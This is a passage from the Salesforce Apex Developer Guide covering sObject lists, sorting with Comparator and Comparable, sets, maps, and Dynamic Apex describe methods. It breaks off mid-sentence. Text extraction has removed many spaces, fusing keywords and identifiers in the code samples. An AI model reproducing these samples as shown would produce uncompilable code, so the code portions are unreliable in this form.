List<Account>myList= new List<Account>();// Definea new list
Accounta = new Account(Name='Acme'); // Createthe accountfirst
myList.add(a);// Add the accountsObject
Accounta2 = myList.get(0);// Retrievethe elementat index0
Bulk Processing
You can bulk-process a list of sObjects by passing a list to the DML operation. This example shows how you can insert a list of accounts.
// Definethe list
List<Account>acctList= new List<Account>();
// CreateaccountsObjects
Accounta1 = new Account(Name='Account1');
Accounta2 = new Account(Name='Account2');
// Add accountsto the list
acctList.add(a1);
acctList.add(a2);
// Bulkinsertthe list
insertacctList;
182
Working with Data in ApexApex Developer Guide

Note:  If you perform a bulk insert of Knowledge article versions, make the ownerId of all records the same.
Record ID Generation
Apex automatically generates IDs for each object in an sObject list that was inserted or upserted using DML. Therefore, a list that contains
more than one instance of an sObject cannot be inserted or upserted even if it has a null ID. This situation would imply that two IDs
would need to be written to the same structure in memory, which is illegal.
For example, the insert statement in the following block of code generates a ListException because it tries to insert a list
with two references to the same sObject (a):
try {
// Createa listwithtwo referencesto the samesObjectelement
Accounta = new Account();
List<Account>accs= new List<Account>{a,a};
// Attemptto insertit...
insertaccs;
// Willnot get here
System.assert(false);
} catch(ListExceptione) {
// But willget here
}
Using Array Notation for One-Dimensional Lists of sObjects
Alternatively, you can use the array notation (square brackets) to declare and reference lists of sObjects.
This example declares a list of accounts using the array notation.
Account[]accts= new Account[1];
This example adds an element to the list using square brackets.
accts[0]= new Account(Name='Acme2');
These examples also use the array notation with sObject lists.
DescriptionExample
Defines an Account list with no elements.
List<Account>accts= new Account[]{};
Defines an Account list with memory allocated for three Accounts:
a new Account object in the first position, null in the second,
and another new Account object in the third.
List<Account>accts= new Account[]
{new Account(),null, new
Account()};
Defines the Contact list with a new list.
List<Contact>contacts= new List<Contact>
(otherList);
183
Working with Data in ApexApex Developer Guide

Sorting Lists of sObjects
Using the List.sort method, you can sort lists of sObjects.
For sObjects, sorting is in ascending order and uses a sequence of comparison steps outlined in the next section. You can create a custom
sort order for sObjects by wrapping your sObject in an Apex class that implements the Comparable interface. You can also create a
custom sort order by passing a class that implements Comparator as a parameter to the sort method. See Custom Sort Order of
sObjects.
Default Sort Order of sObjects
The List.sort method sorts sObjects in ascending order and compares sObjects using an ordered sequence of steps that specify
the labels or fields used. The comparison starts with the first step in the sequence and ends when two sObjects are sorted using specified
labels or fields. The following is the comparison sequence used:
1.The label of the sObject type.
For example, an Account sObject appears before a Contact.
2.The Name field, if applicable.
For example, if the list contains two accounts named Alpha and Beta, account Alpha comes before account Beta.
3.Standard fields, starting with the fields that come first in alphabetical order, except for the Id and Name fields.
For example, if two accounts have the same name, the first standard field used for sorting is AccountNumber.
4.Custom fields, starting with the fields that come first in alphabetical order.
For example, suppose two accounts have the same name and identical standard fields, and there are two custom fields, FieldA and
FieldB, the value of FieldA is used first for sorting.
Not all steps in this sequence are necessarily carried out. For example, a list containing two sObjects of the same type and with unique
Name values is sorted based on the Name field and sorting stops at step 2. Otherwise, if the names are identical or the sObject doesn’t
have a Name field, sorting proceeds to step 3 to sort by standard fields.
For text fields, the sort algorithm uses the Unicode sort order. Also, empty fields precede non-empty fields in the sort order.
Here’s an example of sorting a list of Account sObjects. This example shows how the Name field is used to place the Acme account
ahead of the two sForce accounts in the list. Since there are two accounts named sForce, the Industry field is used to sort these remaining
accounts because the Industry field comes before the Site field in alphabetical order.
Account[]acctList= new List<Account>();
acctList.add(new Account(
Name='sForce',
Industry='Biotechnology',
Site='Austin'));
acctList.add(new Account(
Name='sForce',
Industry='Agriculture',
Site='NewYork'));
acctList.add(new Account(
Name='Acme'));
System.debug(acctList);
acctList.sort();
Assert.areEqual('Acme', acctList[0].Name);
Assert.areEqual('sForce', acctList[1].Name);
184
Working with Data in ApexApex Developer Guide

Assert.areEqual('Agriculture', acctList[1].Industry);
Assert.areEqual('sForce', acctList[2].Name);
Assert.areEqual('Biotechnology', acctList[2].Industry);
System.debug(acctList);
This example is similar to the previous one, except that it uses the Merchandise__c custom object. This example shows how the Name
field is used to place the Notebooks merchandise ahead of Pens in the list. Because there are two merchandise sObjects with the Name
field value of Pens, the Description field is used to sort these remaining merchandise items. The Description field is used for sorting
because it comes before the Price and Total_Inventory fields in alphabetical order.
Merchandise__c[]merchList= new List<Merchandise__c>();
merchList.add(new Merchandise__c(
Name='Pens',
Description__c='Redpens',
Price__c=2,
Total_Inventory__c=1000));
merchList.add(new Merchandise__c(
Name='Notebooks',
Description__c='Coolnotebooks',
Price__c=3.50,
Total_Inventory__c=2000));
merchList.add(new Merchandise__c(
Name='Pens',
Description__c='Bluepens',
Price__c=1.75,
Total_Inventory__c=800));
System.debug(merchList);
merchList.sort();
Assert.areEqual('Notebooks', merchList[0].Name);
Assert.areEqual('Pens', merchList[1].Name);
Assert.areEqual('Bluepens', merchList[1].Description__c);
Assert.areEqual('Pens', merchList[2].Name);
Assert.areEqual('Redpens', merchList[2].Description__c);
System.debug(merchList);
Custom Sort Order of sObjects
To create a custom sort order for sObjects in lists, implement the Comparator interface and pass it as a parameter to the List.sort
method.
Alternatively, create a wrapper class for the sObject and implement the Comparable interface. The wrapper class contains the sObject
in question and implements the Comparable.compareTo method in which you specify the sort logic.
Example: This example implements the Comparator interface to compare two opportunities based on the Amount field.
publicclassOpportunityComparatorimplementsComparator<Opportunity>{
publicIntegercompare(Opportunityo1, Opportunityo2) {
// The returnvalueof 0 indicatesthatbothelementsare equal.
IntegerreturnValue= 0;
if(o1== null&& o2 == null){
returnValue= 0;
} elseif(o1== null){
// nulls-firstimplementation
185
Working with Data in ApexApex Developer Guide

returnValue= -1;
} elseif(o2== null){
// nulls-firstimplementation
returnValue= 1;
} elseif ((o1.Amount== null)&& (o2.Amount== null)){
// bothhavenullAmounts
returnValue= 0;
} elseif (o1.Amount== null){
// nulls-firstimplementation
returnValue= -1;
} elseif (o2.Amount== null){
// nulls-firstimplementation
returnValue= 1;
} elseif (o1.Amount< o2.Amount){
// Set returnvalueto a negativevalue.
returnValue= -1;
} elseif (o1.Amount> o2.Amount){
// Set returnvalueto a positivevalue.
returnValue= 1;
}
returnreturnValue;
}
}
This test sorts a list of Comparator objects and verifies that the list elements are sorted by the opportunity amount.
@isTest
privateclassOpportunityComparator_Test{
@isTest
staticvoidsortViaComparator(){
// Add the opportunitywrapperobjectsto a list.
List<Opportunity>oppyList= new List<Opportunity>();
DatecloseDate= Date.today().addDays(10);
oppyList.add(new Opportunity(
Name='EdgeInstallation',
CloseDate=closeDate,
StageName='Prospecting',
Amount=50000));
oppyList.add(new Opportunity(
Name='UnitedOil Installations',
CloseDate=closeDate,
StageName='NeedsAnalysis',
Amount=100000));
oppyList.add(new Opportunity(
Name='GrandHotelsSLA',
CloseDate=closeDate,
StageName='Prospecting',
Amount=25000));
oppyList.add(null);
// Sortthe objectsusingthe Comparatorimplementation
oppyList.sort(newOpportunityComparator());
// Verifythe sortorder
Assert.isNull(oppyList[0]);
186
Working with Data in ApexApex Developer Guide

Assert.areEqual('GrandHotelsSLA',oppyList[1].Name);
Assert.areEqual(25000,oppyList[1].Amount);
Assert.areEqual('EdgeInstallation',oppyList[2].Name);
Assert.areEqual(50000,oppyList[2].Amount);
Assert.areEqual('UnitedOil Installations',oppyList[3].Name);
Assert.areEqual(100000,oppyList[3].Amount);
// Writethe sortedlistcontentsto the debuglog.
System.debug(oppyList);
}
}
Example: This example shows how to create a wrapper Comparable class for Opportunity. The implementation of the
compareTo method in this class compares two opportunities based on the Amount field—the class member variable contained
in this instance, and the opportunity object passed into the method.
publicclassOpportunityWrapperimplementsComparable{
publicOpportunityoppy;
// Constructor
publicOpportunityWrapper(Opportunityop) {
// Guardagainstwrappinga null
if(op == null) {
Exceptionex = new NullPointerException();
ex.setMessage('Opportunityargumentcannotbe null');
throwex;
}
oppy= op;
}
// Compareopportunitiesbasedon the opportunityamount.
publicIntegercompareTo(ObjectcompareTo){
// Castargumentto OpportunityWrapper
OpportunityWrappercompareToOppy= (OpportunityWrapper)compareTo;
// The returnvalueof 0 indicatesthatbothelementsare equal.
IntegerreturnValue= 0;
if ((oppy.Amount== null) && (compareToOppy.oppy.Amount== null)) {
// bothwrappershavenullAmounts
returnValue= 0;
} elseif ((oppy.Amount== null) && (compareToOppy.oppy.Amount!= null)){
// nulls-firstimplementation
returnValue= -1;
} elseif ((oppy.Amount!= null) && (compareToOppy.oppy.Amount== null)){
// nulls-firstimplementation
returnValue= 1;
} elseif (oppy.Amount> compareToOppy.oppy.Amount){
// Set returnvalueto a positivevalue.
returnValue= 1;
} elseif (oppy.Amount< compareToOppy.oppy.Amount){
// Set returnvalueto a negativevalue.
returnValue= -1;
}
returnreturnValue;
187
Working with Data in ApexApex Developer Guide

}
}
This test sorts a list of OpportunityWrapper objects and verifies that the list elements are sorted by the opportunity amount.
@isTest
privateclassOpportunityWrapperTest{
statictestmethodvoidtest1(){
// Add the opportunitywrapperobjectsto a list.
OpportunityWrapper[]oppyList= new List<OpportunityWrapper>();
DatecloseDate= Date.today().addDays(10);
oppyList.add(new OpportunityWrapper(new Opportunity(
Name='EdgeInstallation',
CloseDate=closeDate,
StageName='Prospecting',
Amount=50000)));
oppyList.add(new OpportunityWrapper(new Opportunity(
Name='UnitedOil Installations',
CloseDate=closeDate,
StageName='NeedsAnalysis',
Amount=100000)));
oppyList.add(new OpportunityWrapper(new Opportunity(
Name='GrandHotelsSLA',
CloseDate=closeDate,
StageName='Prospecting',
Amount=25000)));
// Sortthe wrapperobjectsusingthe implementationof the
// compareTomethod.
oppyList.sort();
// Verifythe sortorder
Assert.areEqual('GrandHotelsSLA', oppyList[0].oppy.Name);
Assert.areEqual(25000,oppyList[0].oppy.Amount);
Assert.areEqual('EdgeInstallation', oppyList[1].oppy.Name);
Assert.areEqual(50000,oppyList[1].oppy.Amount);
Assert.areEqual('UnitedOil Installations', oppyList[2].oppy.Name);
Assert.areEqual(100000,oppyList[2].oppy.Amount);
// Writethe sortedlistcontentsto the debuglog.
System.debug(oppyList);
}
}
SEE ALSO:
Apex Reference Guide: Collator Class
Apex Reference Guide: Comparable Interface
Apex Reference Guide: Comparator Interface
Expanding sObject and List Expressions
As in Java, sObject and list expressions can be expanded with method references and list expressions, respectively, to form new expressions.
188
Working with Data in ApexApex Developer Guide

In the following example, a new variable containing the length of the new account name is assigned to acctNameLength.
IntegeracctNameLength= new Account[]{new Account(Name='Acme')}[0].Name.length();
In the above, new Account[] generates a list.
The list is populated with one element by the new statement {new Account(name='Acme')}.
Item 0, the first item in the list, is then accessed by the next part of the string [0].
The name of the sObject in the list is accessed, followed by the method returning the length name.length().
In the following example, a name that has been shifted to lower case is returned. The SOQL statement returns a list of which the first
element (at index 0) is accessed through [0]. Next, the Name field is accessed and converted to lowercase with this expression
.Name.toLowerCase().
StringnameChange= [SELECTNameFROMAccount][0].Name.toLowerCase();
Sets of Objects
Sets can contain sObjects among other types of elements.
Sets contain unique elements. Uniqueness of sObjects is determined by comparing the objects’ fields. For example, if you try to add two
accounts with the same name to a set, with no other fields set, only one sObject is added to the set.
// Createtwo accounts,a1 and a2
Accounta1 = new account(name='MyAccount');
Accounta2 = new account(name='MyAccount');
// Add bothaccountsto the new set
Set<Account>accountSet= new Set<Account>{a1,a2};
// Verifythatthe set onlycontainsone item
System.assertEquals(accountSet.size(),1);
If you add a description to one of the accounts, it is considered unique and both accounts are added to the set.
// Createtwo accounts,a1 and a2, and add a descriptionto a2
Accounta1 = new account(name='MyAccount');
Accounta2 = new account(name='MyAccount', description='My testaccount');
// Add bothaccountsto the new set
Set<Account>accountSet= new Set<Account>{a1,a2};
// Verifythatthe set containstwo items
System.assertEquals(accountSet.size(),2);
Warning:  If set elements are objects, and these objects change after being added to the collection, they won’t be found anymore
when using, for example, the contains or containsAll methods, because of changed field values.
Maps of sObjects
Map keys and values can be of any data type, including sObject types, such as Account.
189
Working with Data in ApexApex Developer Guide

Maps can hold sObjects both in their keys and values. A map key represents a unique value that maps to a map value. For example, a
common key would be an ID that maps to an account (a specific sObject type). This example shows how to define a map whose keys
are of type ID and whose values are of type Account.
Map<ID, Account>m = new Map<ID, Account>();
As with primitive types, you can populate map key-value pairs when the map is declared by using curly brace ({}) syntax. Within the
curly braces, specify the key first, then specify the value for that key using =>. This example creates a map of integers to accounts lists
and adds one entry using the account list created earlier.
Account[]accs= new Account[5];// Account[]is synonymouswithList<Account>
Map<Integer, List<Account>>m4 = new Map<Integer, List<Account>>{1=> accs};
Maps allow sObjects in their keys. You must use sObjects in the keys only when the sObject field values won’t change.
Auto-Populating Map Entries from a SOQL Query
When working with SOQL queries, maps can be populated from the results returned by the SOQL query. The map key must be declared
with an ID or String data type, and the map value must be declared as an sObject data type.
This example shows how to populate a new map from a query. In the example, the SOQL query returns a list of accounts with their Id
and Name fields. The new operator uses the returned list of accounts to create a map.
// Populatemap fromSOQLquery
Map<ID, Account>m = new Map<ID, Account>([SELECTId, NameFROMAccountLIMIT10]);
// Afterpopulatingthe map,iteratethroughthe map entries
for (ID idKey: m.keyset()){
Accounta = m.get(idKey);
System.debug(a);
}
One common usage of this map type is for in-memory “joins” between two tables.
Note:  RecentlyViewed records for users who are members of several communities can’t be retrieved automatically into a map
via Apex. This is because records of a user with different networks can result in duplicate IDs that maps don’t support. For more
information, see RecentlyViewed.
Using Map Methods
The Map class exposes various methods that you can use to work with map elements, such as adding, removing, or retrieving elements.
This example uses Map methods to add new elements and retrieve existing elements from the map. This example also checks for the
existence of a key and gets the set of all keys. The map in this example has one element with an integer key and an account value.
AccountmyAcct= new Account();//Definea new account
Map<Integer, Account>m = new Map<Integer, Account>();// Definea new map
m.put(1,myAcct);// Inserta new key-valuepairin the map
System.assert(!m.containsKey(3));// Assertthatthe map containsa key
Accounta = m.get(1);// Retrievea value,givena particularkey
Set<Integer> s = m.keySet();// Returna set thatcontainsall of the keysin the
map
sObject Map Considerations
190
Working with Data in ApexApex Developer Guide

sObject Map Considerations
Be cautious when using sObjects as map keys. Key matching for sObjects is based on the comparison of all sObject field values. If one
or more field values change after adding an sObject to the map, attempting to retrieve this sObject from the map returns null. This
is because the modified sObject isn’t found in the map due to different field values. This can occur if you explicitly change a field on the
sObject, or if the sObject fields are implicitly changed by the system; for example, after inserting an sObject, the sObject variable has the
ID field autofilled. Attempting to fetch this Object from a map to which it was added before the insert operation won’t yield the
map entry, as shown in this example.
// Createan accountand add it to the map
Accounta1 = new Account(Name='A1');
Map<sObject,Integer> m = new Map<sObject,Integer>{
a1 => 1};
// Get a1'svaluefromthe map.
// Returnsthe valueof 1.
System.assertEquals(1,m.get(a1));
// Id fieldis null.
System.assertEquals(null, a1.Id);
// Inserta1.
// Thiscausesthe ID fieldon a1 to be auto-filled
inserta1;
// Id fieldis now populated.
System.assertNotEquals(null, a1.Id);
// Get a1'svaluefromthe map again.
// ReturnsnullbecauseMap.get(sObject)doesn'tfind
// the entrybasedon the sObjectwithan auto-filledID.
// Thisis becausewhena1 was originallyaddedto the map
// beforethe insertoperation,the ID of a1 was null.
System.assertEquals(null, m.get(a1));
Another scenario where sObject fields are autofilled is in triggers, for example, when using before and after insert triggers for an sObject.
If those triggers share a static map defined in a class, and the sObjects in Trigger.New are added to this map in the before trigger,
the sObjects in Trigger.New in the after trigger aren’t found in the map because the two sets of sObjects differ by the fields that
are autofilled. The sObjects in Trigger.New in the after trigger have system fields populated after insertion, namely: ID, CreatedDate,
CreatedById, LastModifiedDate, LastModifiedById, and SystemModStamp.
Dynamic Apex
Dynamic Apex enables developers to create more flexible applications by providing them with the ability to:
•
Access sObject and field describe information
Describe information provides metadata information about sObject and field properties. For example, the describe information for
an sObject includes whether that type of sObject supports operations like create or undelete, the sObject's name and label, the
sObject's fields and child objects, and so on. The describe information for a field includes whether the field has a default value,
whether it is a calculated field, the type of the field, and so on.
Note that describe information provides information about objects in an organization, not individual records.
•
Access Salesforce app information
191
Working with Data in ApexApex Developer Guide

You can obtain describe information for standard and custom apps available in the Salesforce user interface. Each app corresponds
to a collection of tabs. Describe information for an app includes the app’s label, namespace, and tabs. Describe information for a tab
includes the sObject associated with the tab, tab icons and colors.
•
Write dynamic SOQL queries, dynamic SOSL queries and dynamic DML
Dynamic SOQL and SOSL queries provide the ability to execute SOQL or SOSL as a string at runtime, while dynamic DML provides the
ability to create a record dynamically and then insert it into the database using DML. Using dynamic SOQL, SOSL, and DML, an
application can be tailored precisely to the organization as well as the user's permissions. This can be useful for applications that are
installed from AppExchange.
1.Understanding Apex Describe Information
2.Using Field Tokens
3.Understanding Describe Information Permissions
4.Describing sObjects Using Schema Method
5.Describing Tabs Using Schema Methods
6.Accessing All sObjects
7.Accessing All Data Categories Associated with an sObject
8.Dynamic SOQL
9.Dynamic SOSL
10.Dynamic DML
Understanding Apex Describe Information
You can describe sObjects either by using tokens or the describeSObjects Schema method.
Apex provides two data structures and a method for sObject and field describe information:
•
Token—a lightweight, serializable reference to an sObject or a field that is validated at compile time. This is used for token describes.
•
The describeSObjects method—a method in the Schema class that performs describes on one or more sObject types.
•
Describe result—an object of type Schema.DescribeSObjectResult that contains all the describe properties for the
sObject or field. Describe result objects are not serializable, and are validated at runtime. This result object is returned when performing
the describe, using either the sObject token or the describeSObjects method.
Describing sObjects Using Tokens
It is easy to move from a token to its describe result, and vice versa. Both sObject and field tokens have the method getDescribe
which returns the describe result for that token. On the describe result, the getSObjectType and getSObjectField methods
return the tokens for sObject and field, respectively.
Because tokens are lightweight, using them can make your code faster and more efficient. For example, use the token version of an
sObject or field when you are determining the type of an sObject or field that your code needs to use. The token can be compared using
the equality operator (==) to determine whether an sObject is the Account object, for example, or whether a field is the Name field or
a custom calculated field.
192
Working with Data in ApexApex Developer Guide

The following code provides a general example of how to use tokens and describe results to access information about sObject and field
properties:
// Createa new accountas the generictypesObject
sObjects = new Account();
// Verifythatthe genericsObjectis an AccountsObject
System.assert(s.getsObjectType()== Account.sObjectType);
// Get the sObjectdescriberesultfor the Accountobject
Schema.DescribeSObjectResultdsr = Account.sObjectType.getDescribe();
// Get the fielddescriberesultfor the Namefieldon the Accountobject
Schema.DescribeFieldResultdfr = Schema.sObjectType.Account.fields.Name;
// Verifythatthe fieldtokenis the tokenfor the Namefieldon an Accountobject
System.assert(dfr.getSObjectField()== Account.Name);
// Get the fielddescriberesultfromthe token
dfr = dfr.getSObjectField().getDescribe();
The following algorithm shows how you can work with describe information in Apex:
1.Generate a list or map of tokens for the sObjects in your organization (see Accessing All sObjects.)
2.Determine the sObject you need to access.
3.Generate the describe result for the sObject.
4.If necessary, generate a map of field tokens for the sObject (see Accessing All Field Describe Results for an sObject.)
5.Generate the describe result for the field the code needs to access.
Using sObject Tokens
SObjects, such as Account and MyCustomObject__c, act as static classes with special static methods and member variables for accessing
token and describe result information. You must explicitly reference an sObject and field name at compile time to gain access to the
describe result.
To access the token for an sObject, use one of the following methods:
•
Access the sObjectType member variable on an sObject type, such as Account.
•
Call the getSObjectType method on an sObject describe result, an sObject variable, a list, or a map.
Schema.SObjectType is the data type for an sObject token.
In the following example, the token for the Account sObject is returned:
Schema.sObjectTypet = Account.sObjectType;
The following also returns a token for the Account sObject:
Accounta = new Account();
Schema.sObjectTypet = a.getSObjectType();
This example can be used to determine whether an sObject or a list of sObjects is of a particular type:
// Createa genericsObjectvariables
SObjects = Database.query('SELECTId FROMAccountLIMIT1');
193
Working with Data in ApexApex Developer Guide

// Verifyif thatsObjectvariableis an Accounttoken
System.assertEquals(s.getSObjectType(),Account.sObjectType);
// Createa listof genericsObjects
List<sObject>sobjList= new Account[]{};
// Verifyif the listof sObjectscontainsAccounttokens
System.assertEquals(sobjList.getSObjectType(),Account.sObjectType);
Some standard sObjects have a field called sObjectType, for example, AssignmentRule, QueueSObject, and RecordType. For these
types of sObjects, always use the getSObjectType method for retrieving the token. If you use the property, for example,
RecordType.sObjectType, the field is returned.
Obtaining sObject Describe Results Using Tokens
To access the describe result for an sObject, use one of the following methods:
•
Call the getDescribe method on an sObject token.
•
Use the Schema sObjectType static variable with the name of the sObject. For example, Schema.sObjectType.Lead.
Schema.DescribeSObjectResult is the data type for an sObject describe result.
The following example uses the getDescribe method on an sObject token:
Schema.DescribeSObjectResultdsr = Account.sObjectType.getDescribe();
The following example uses the Schema sObjectType static member variable:
Schema.DescribeSObjectResultdsr = Schema.SObjectType.Account;
For more information about the methods available with the sObject describe result, see DescribeSObjectResultClass.
SEE ALSO:
DescribeSObjectResult.fields()
DescribeSObjectResult.fieldsets()
Using Field Tokens
To access the token for a field, use one of the following methods:
•
Access the static member variable name of an sObject static type, for example, Account.Name.
•
Call the getSObjectField method on a field describe result.
The field token uses the data type Schema.SObjectField.
In the following example, the field token is returned for the Account object's Description field:
Schema.SObjectFieldfieldToken= Account.Description;
In the following example, the field token is returned from the field describe result:
// Get the describeresultfor the Namefieldon the Accountobject
Schema.DescribeFieldResultdfr = Schema.sObjectType.Account.fields.Name;
// Verifythatthe fieldtokenis the tokenfor the Namefieldon an Accountobject
System.assert(dfr.getSObjectField()== Account.Name);
194
Working with Data in ApexApex Developer Guide

// Get the describeresultfromthe token
dfr = dfr.getSObjectField().getDescribe();
Note: Field tokens aren't available for person accounts. If you access Schema.Account.fieldname, you get an exception
error. Instead, specify the field name as a string.
Using Field Describe Results
To access the describe result for a field, use one of the following methods:
•
Call the getDescribe method on a field token.
•
Access the fields member variable of an sObject token with a field member variable (such as Name, BillingCity, and so
on.)
The field describe result uses the data type Schema.DescribeFieldResult.
The following example uses the getDescribe method:
Schema.DescribeFieldResultdfr = Account.Description.getDescribe();
This example uses the fields member variable method:
Schema.DescribeFieldResultdfr = Schema.SObjectType.Account.fields.Name;
In the example above, the system uses special parsing to validate that the final member variable (Name) is valid for the specified sObject
at compile time. When the parser finds the fields member variable, it looks backwards to find the name of the sObject (Account).
It validates that the field name following the fields member variable is legitimate. The fields member variable only works when
used in this manner.
Note:  Don’t use the fields member variable without also using either a field member variable name or the getMap method.
For more information on getMap, see the next section.
For more information about the methods available with a field describe result, see DescribeFieldResultClass.
Accessing All Field Describe Results for an sObject
Use the field describe result's getMap method to return a map that represents the relationship between all the field names (keys) and
the field tokens (values) for an sObject.
The following example generates a map that can be used to access a field by name:
Map<String, Schema.SObjectField>fieldMap= Schema.SObjectType.Account.fields.getMap();
Note:  The value type of this map is not a field describe result. Using the describe results would take too many system resources.
Instead, it is a map of tokens that you can use to find the appropriate field. After you determine the field, generate the describe
result for it.
The map has the following characteristics:
•
It is dynamic, that is, it is generated at runtime on the fields for that sObject.
•
All field names are case insensitive.
•
The keys use namespaces as required.
•
The keys reflect whether the field is a custom object.
195
Working with Data in ApexApex Developer Guide

Field Describe Considerations
Note the following when describing fields.
•
A field describe that’s executed from within an installed managed package returns Chatter fields even if Chatter is not enabled in
the installing organization. This is not true if the field describe is executed from a class that’s not within an installed managed package.
•
When you describe sObjects and their fields from within an Apex class, custom fields of new field types are returned regardless of
the API version that the class is saved in. If a field type, such as the geolocation field type, is available only in a recent API version,
components of a geolocation field are returned even if the class is saved in an earlier API version.
Versioned Behavior Changes
In API version 34.0 and later, Schema.DescribeSObjectResult on a custom SObjectType includes map keys prefixed with the namespace,
even if the namespace is that of currently executing code. If you work with multiple namespaces and generate runtime describe data,
make sure that your code accesses keys correctly using the namespace prefix.
SEE ALSO:
DescribeSObjectResult.fields()
DescribeSObjectResult.fieldsets()
Understanding Describe Information Permissions
Apex classes and triggers run in system mode. Classes and triggers have no restrictions on dynamically looking up any sObject that is
available in the org. You can generate a map of all the sObjects for your org regardless of the current user’s permission, unless you are
executing anonymous Apex.
User permissions matter when you execute describe calls in an anonymous block.. As a result, not all sObjects and fields can be looked
up if access is restricted for the running user. For example, if you describe account fields in an anonymous block and you don’t have
access to all fields, not all fields are returned. However, all fields are returned for the same call in an Apex class.
For more information, see “About API and Dynamic Apex Access in Packages” in Salesforce Help.
SEE ALSO:
Anonymous Blocks
What is a Package?
Describing sObjects Using Schema Method
As an alternative to using tokens, you can describe sObjects by calling the describeSObjects Schema method and passing one
or more sObject type names for the sObjects you want to describe.
This example gets describe metadata information for two sObject types—The Account standard object and the Merchandise__c custom
object. After obtaining the describe result for each sObject, this example writes the returned information to the debug output, such as
the sObject label, number of fields, whether it is a custom object or not, and the number of child relationships.
// sObjecttypesto describe
String[] types= new String[]{'Account','Merchandise__c'};
// Makethe describecall
Schema.DescribeSobjectResult[]results= Schema.describeSObjects(types);
System.debug('Gotdescribeinformationfor ' + results.size()+ ' sObjects.');
196
Working with Data in ApexApex Developer Guide

// For eachreturnedresult,get someinfo
for(Schema.DescribeSobjectResultres : results){
System.debug('sObjectLabel:' + res.getLabel());
System.debug('Numberof fields:' + res.fields.getMap().size());
System.debug(res.isCustom()? 'Thisis a customobject.': 'Thisis a standardobject.');
// Get childrelationships
Schema.ChildRelationship[]rels= res.getChildRelationships();
if (rels.size()> 0) {
System.debug(res.getName()+ ' has ' + rels.size()+ ' childrelationships.');
}
}
SEE ALSO:
DescribeSObjectResult.fields()
DescribeSObjectResult.fieldsets()
Describing Tabs Using Schema Methods
You can get metadata information about the apps and their tabs available in the Salesforce user interface by executing a describe call
in Apex. Also, you can get more detailed information about each tab. Use the describeTabs Schema method and the getTabs
method in Schema.DescribeTabResult, respectively.
This example shows how to get the tab sets for each app. The example then obtains tab describe metadata information for the Sales
app. For each tab, metadata information includes the icon URL, whether the tab is custom or not, and colors among others. The tab
describe information is written to the debug output.
// Get tab set describesfor eachapp
List<Schema.DescribeTabSetResult>tabSetDesc= Schema.describeTabs();
// Iteratethrougheachtab set describefor eachapp and displaythe info
for(DescribeTabSetResulttsr : tabSetDesc){
StringappLabel= tsr.getLabel();
System.debug('Label:' + appLabel);
System.debug('LogoURL:' + tsr.getLogoUrl());
System.debug('isSelected:' + tsr.isSelected());
Stringns = tsr.getNamespace();
if (ns == '') {
System.debug('The' + appLabel+ ' app has no namespacedefined.');
}
else{
System.debug('Namespace:' + ns);
}
// Displaytab infofor the Salesapp
if (appLabel== 'Sales') {
List<Schema.DescribeTabResult>tabDesc= tsr.getTabs();
System.debug('-- Tab informationfor the Salesapp --');
for(Schema.DescribeTabResulttr : tabDesc){
System.debug('getLabel:' + tr.getLabel());
System.debug('getColors:' + tr.getColors());
System.debug('getIconUrl:' + tr.getIconUrl());
197
Working with Data in ApexApex Developer Guide

System.debug('getIcons:' + tr.getIcons());
System.debug('getMiniIconUrl:' + tr.getMiniIconUrl());
System.debug('getSobjectName:' + tr.getSobjectName());
System.debug('getUrl:' + tr.getUrl());
System.debug('isCustom:' + tr.isCustom());
}
}
}
// Exampledebugstatementoutput
// DEBUG|Label:Sales
// DEBUG|LogoURL:
https://MyDomainName.my.salesforce.com/img/seasonLogos/2014_winter_aloha.png
// DEBUG|isSelected:true
// DEBUG|TheSalesapp has no namespacedefined.//DEBUG|--Tab informationfor the Sales
app --
// (Thisis an exampledebugoutputfor the Accountstab.)
// DEBUG|getLabel:Accounts
// DEBUG|getColors:
(Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme4;],
//Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme3;],
//Schema.DescribeColorResult[getColor=236FBD;getContext=primary;getTheme=theme2;])
// DEBUG|getIconUrl:https://MyDomainName.my.salesforce.com/img/icon/accounts32.png
// DEBUG|getIcons:
(Schema.DescribeIconResult[getContentType=image/png;getHeight=32;getTheme=theme3;
//
getUrl=https://MyDomainName.my.salesforce.com/img/icon/accounts32.png;getWidth=32;],
//Schema.DescribeIconResult[getContentType=image/png;getHeight=16;getTheme=theme3;
//
getUrl=https://MyDomainName.my.salesforce.com/img/icon/accounts16.png;getWidth=16;])
// DEBUG|getMiniIconUrl:https://MyDomainName.my.salesforce.com/img/icon/accounts16.png
// DEBUG|getSobjectName:Account
// DEBUG|getUrl:https://MyDomainName.my.salesforce.com/001/o
// DEBUG|isCustom:false
Accessing All sObjects
Use the Schema getGlobalDescribe method to return a map that represents the relationship between all sObject names (keys)
to sObject tokens (values). For example:
Map<String, Schema.SObjectType>gd = Schema.getGlobalDescribe();
The map has the following characteristics:
•
It is dynamic, that is, it is generated at runtime on the sObjects currently available for the organization, based on permissions.
•
The sObject names are case insensitive.
•
The keys are prefixed with the namespace, if any.
*
•
The keys reflect whether the sObject is a custom object.
*
 Starting with Apex saved using Salesforce API version 28.0, the keys in the map that getGlobalDescribe returns are always
prefixed with the namespace, if any, of the code in which it is running. For example, if the code block that makes the
getGlobalDescribe call is in namespace NS1, and a custom object named MyObject__c is in the same namespace, the key
198
Working with Data in ApexApex Developer Guide

returned is NS1__MyObject__c. For Apex saved using earlier API versions, the key contains the namespace only if the namespace
of the code block and the namespace of the sObject are different. For example, if the code block that generates the map is in namespace
N1, and an sObject is also in N1, the key in the map is represented as MyObject__c. However, if the code block is in namespace N1,
and the sObject is in namespace N2, the key is N2__MyObject__c.
Standard sObjects have no namespace prefix.
Note:  If the getGlobalDescribe method is called from an installed managed package, it returns sObject names and tokens
for Chatter sObjects, such as NewsFeed and UserProfileFeed, even if Chatter is not enabled in the installing organization. This is
not true if the getGlobalDescribe method is called from a class not within an installed managed package.
Accessing All Data Categories Associated with an sObject
Use the describeDataCategoryGroups and describeDataCategoryGroupStructures methods to return the
categories associated with a specific object:
1.Return all the category groups associated with the objects of your choice (see
describeDataCategoryGroups(sObjectNames)).
2.From the returned map, get the category group name and sObject name you want to further interrogate (see
DescribeDataCategoryGroupResult Class).
3.Specify the category group and associated object, then retrieve the categories available to this object (see
describeDataCategoryGroupStructures).
The describeDataCategoryGroupStructures method returns the categories available for the object in the category group
you specified. For additional information about data categories, see “Work with Data Categories” in the Salesforce online help.
In the following example, the describeDataCategoryGroupSample method returns all the category groups associated with
the Article and Question objects. The describeDataCategoryGroupStructures method returns all the categories available
